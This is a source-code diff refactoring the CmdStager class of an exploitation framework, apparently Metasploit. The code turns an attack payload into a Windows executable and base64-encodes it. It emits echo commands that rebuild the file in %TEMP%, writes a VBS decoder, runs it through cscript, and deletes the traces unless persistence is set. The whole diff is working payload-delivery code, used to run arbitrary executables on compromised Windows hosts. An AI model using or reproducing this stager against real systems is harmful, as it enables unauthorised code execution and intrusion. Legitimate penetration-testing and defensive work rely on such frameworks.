@@ -13,131 +13,119 @@ module Exploitation
 
 class CmdStager
 
-	module Windows
-		Alias = "win"
-
-		module X86
-			Alias = ARCH_X86
-		end
-
-		module X86_64
-			Alias = ARCH_X86_64
-		end
-	end
-
-
 	def initialize(payload, framework, platform, arch = nil)
 		@var_decoder = Rex::Text.rand_text_alpha(5)
 		@var_encoded = Rex::Text.rand_text_alpha(5)
 		@var_batch   = Rex::Text.rand_text_alpha(5)
 		@decoder	    =	File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "decoder_stub") # need error checking here
 		@framework   =	framework
-		@exes	       = Msf::Util::EXE.to_win32pe(@framework, payload.encoded)
 		@linelen     = 2047 # covers most likely cases
 
-		platform   = platform.names[0] if (platform.kind_of?(Msf::Module::PlatformList))
-
-		# Use the first architecture if one was specified
-		arch = arch[0] if (arch.kind_of?(Array))
-
-		if platform.nil?
-			raise RuntimeError, "No platform restrictions were specified -- cannot select egghunter"
-		end
-
-		CmdStager.constants.each { |c|
-			mod = self.class.const_get(c)
-
-			next if ((!mod.kind_of?(::Module)) or
-					(!mod.const_defined?('Alias')))
-
-			if (platform =~ /#{mod.const_get('Alias')}/i)
-				self.extend(mod)
-
-				if (arch and mod)
-					mod.constants.each { |a|
-						amod = mod.const_get(a)
-
-						next if ((!amod.kind_of?(::Module)) or
-						         (!amod.const_defined?('Alias')))
-
-						if (arch =~ /#{mod.const_get(a).const_get('Alias')}/i)
-							amod = mod.const_get(a)
-
-							self.extend(amod)
-						end
-					}
-				end
-			end
-		}
-
+		# XXX: TODO: support multipl architectures/platforms
+		@exe	       = Msf::Util::EXE.to_win32pe(@framework, payload.encoded)
 	end
 
-	# generates the cmd payload including the h2bv2 decoder and encoded payload
-	# also performs cleanup and removed any left over files
+
+	#
+	# Generates the cmd payload including the h2bv2 decoder and encoded payload.
+	# The resulting commands also perform cleanup, removing any left over files
+	#
 	def generate(opts = {}, linelen = 200)
 		@linelen = linelen
-		cmd = payload_exe
 
-		return cmd
+		# Return the output from payload_exe
+		payload_exe(opts)
 	end
 
-	def payload_exe(persist = false)
 
-		if(persist)
-			opts = {:persist => true}
-		else
-			opts = {}
+	#
+	# This does the work of actually building an array of commands that
+	# when executed will create and run an executable payload.
+	#
+	def payload_exe(opts)
+
+		persist = opts[:persist]
+
+		# Initialize an arry of commands to execute
+		cmds = []
+
+		# Add the exe building commands (write to .b64)
+		cmds += encode_payload()
+
+		# Add the decoder script building commands
+		cmds += generate_decoder()
+
+		# Make it all happen
+		cmds << "cscript //nologo %TEMP%\\#{@var_decoder}.vbs"
+
+		# If we're not persisting, clean up afterwards
+		if (not persist)
+			cmds << "del %TEMP%\\#{@var_decoder}.vbs"
+			cmds << "del %TEMP%\\#{@var_encoded}.b64"
 		end
 
-		decoder = generate_decoder()
+		# Compress commands into as few lines as possible.
+		new_cmds = []
+		line = ''
+		cmds.each { |cmd|
+			# If this command will fit...
+			if ((line.length + cmd.length + 4) < @linelen)
+				line << " & " if line.length > 0
+				line << cmd
+			else
+				# It won't fit.. If we don't have something error out
+				if (line.length < 1)
+					raise RuntimeError, 'Line fit problem -- file a bug'
+				end
+				# If it won't fit even after emptying the current line, error out..
+				if (cmd.length > @linelen)
+					raise RuntimeError, 'Line too long - %d bytes' % cmd.length
+				end
+				new_cmds << line
+				line = ''
+				line << cmd
+			end
+		}
+		new_cmds << line if (line.length > 0)
 
-		exe = @exes.dup
-		encoded = encode_payload(exe)
-
-		stage = encoded + decoder
-		stage << "cscript //nologo %TEMP%\\#{@var_decoder}.vbs\n"
-
-		if(not persist)
-			stage << "del %TEMP%\\#{@var_decoder}.vbs\n"
-			stage << "del %TEMP%\\#{@var_encoded}.b64\n"
-		end
-
-		return stage
+		# Return the final array.
+		new_cmds
 	end
+
 
 	def generate_decoder()
-		decoder = File.read(@decoder, File.size(@decoder))
+		# Read the decoder data file
+		f = File.new(@decoder, "rb")
+		decoder = f.read(f.stat.size)
+		f.close
+
+		# Replace variables
 		decoder.gsub!(/decode_stub/, "%TEMP%\\#{@var_decoder}.vbs")
 		decoder.gsub!(/ENCODED/, "%TEMP%\\#{@var_encoded}.b64")
 		decoder.gsub!(/DECODED/, "%TEMP%\\#{@var_batch}.exe")
 
-		return decoder
+		# Split it apart by the lines
+		decoder.split("\n")
 	end
 
-	def encode_payload(cmd)
-		tmp = Rex::Text.encode_base64(cmd)
-		encoded = ""
 
-		buf = buffer_exe(tmp)
-		buf.each_line { | line |
-			encoded << "echo " << line.chomp << ">>%TEMP%\\#{@var_encoded}.b64\n"
-		}
+	def encode_payload()
+		tmp = Rex::Text.encode_base64(@exe)
+		orig = tmp.dup
 
-		return encoded
-	end
-
-protected
-
-	# restricts line length of commands so that the commands will not exceed
-	# user specified values or os_detect set linelen
-	# each line will never exceed linelen bytes in length
-	def buffer_exe(buf)
-		0.upto(buf.length) do | offset |
-			if(offset % @linelen == 0 && offset != 0 || offset == buf.length)
-				buf.insert(offset, "\n")
-			end
+		cmds = []
+		l_start = "echo "
+		l_end   = ">>%TEMP%\\#{@var_encoded}.b64"
+		xtra_len = l_start.length + @var_encoded.length + l_end.length + 1
+		while (tmp.length > 0)
+			cmd = ''
+			cmd << l_start
+			cmd << tmp.slice!(0, (@linelen - xtra_len))
+			cmd << l_end
+			cmds << cmd
 		end
-		return buf
+
+		cmds
 	end
 
 end
